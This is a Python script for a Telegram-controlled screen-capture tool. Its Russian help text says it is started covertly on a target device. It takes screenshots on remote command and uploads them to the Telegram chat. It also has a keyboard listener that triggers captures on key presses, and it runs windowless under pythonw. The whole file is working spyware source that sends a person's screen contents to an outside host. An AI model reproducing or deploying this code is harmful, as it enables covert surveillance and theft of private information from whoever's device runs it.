# to start: cmd -> start pythonw screensender.pyw
# to stop: task manager -> Python -> kill
#!pip install pytelegrambotapi
#!pip install mss
from PIL import Image, ImageGrab
from pynput.keyboard import Listener, Key
import time
import telebot
from telebot import types
from threading import Timer
from mss import mss

class BOT():
    def __init__(self,bot):
        self.bot = bot
        @bot.message_handler(commands=["start"])
        def start(m, res=False):
            print('Start!')
            self.id = m.chat.id
            self.keyboard = types.ReplyKeyboardMarkup(resize_keyboard=True)
            self.button_1 = types.KeyboardButton(text="/get_low")
            self.keyboard.add(self.button_1)
            self.button_2 = types.KeyboardButton(text="/get_high")
            self.keyboard.add(self.button_2)
            self.bot.send_message(self.id, 'I am screen sender bot! \n/help - info', reply_markup=self.keyboard)
            
        @bot.message_handler(commands=["help"])
        def info(m, res=False):
            print('Help!')
            self.id = m.chat.id
            self.send_message('Программа скрытно запускается на транслирующем устройстве, затем на одном из прослушивающих устройсв можно выполнить: \
                              \n/get_low - получить скриншот низкого качества \
                              \n/get_high - получить скриншот высокого качества (в виде файла) \
                              \n/key_on  - включить прослушивание клавиатуры, на транслирующем устройстве появляется возможность: \
                              \n\t\tleft ctrl - отправить скриншот низкого качества \
                              \n\t\tleft shift - отправить скриншот высокого качества \
                              \n\t\tesc - остановить прослушивание клавиатуры \
                              \n/key_off - остановить прослушивание клавиатуры \
                              \n/help')
                
        @bot.message_handler(commands=["key_on"])
        def start_keyboard_listening(m, res=False):
            print('Start keyboard listening!')
            try:
                self.listener.stop()
            except:
                pass
            finally:
                self.send_message('Start keyboard listening')
                self.listener = Listener(on_press=self.on_press)
                self.listener.start()

                
        @bot.message_handler(commands=["get_low"])
        def get_low(m):
            print('Get low!')
            self.send_screen_low_quality()
            
        @bot.message_handler(commands=["get_high"])
        def get_high(m):
            print('Get high!')
            self.send_screen_high_quality()
           
        @bot.message_handler(commands=["key_off"])
        def stop(m):
            try:
                print('Stop!')
                self.on_press('stop_command')   
            except:
                print('Error stop')
    
            
    def send_screen_low_quality(self):
        with mss() as sct:
            sct.shot()
        img = Image.open(r"monitor-1.png") 
        bot.send_photo(self.id, img)

    def send_screen_high_quality(self):
        with mss() as sct:
            sct.shot()
        with open("monitor-1.png", "rb") as img:
            bot.send_document(self.id, img)
        
    def send_message(self,message):
        self.bot.send_message(self.id, message)

    
    def on_press(self, key):
        if  str(key)=='Key.ctrl_l':
            self.send_screen_low_quality()
        elif  str(key)=='Key.shift':
            self.send_screen_high_quality()
        elif str(key) == str('Key.esc'):
            self.send_message('Listening stopped by device')         
            self.listener.stop()
        elif str(key) == 'stop_command':
            self.send_message('Listening stopped by command')         
            self.listener.stop()
            
token = ''
bot = telebot.TeleBot(token)
x = BOT(bot)
bot.polling(none_stop=True, interval=0)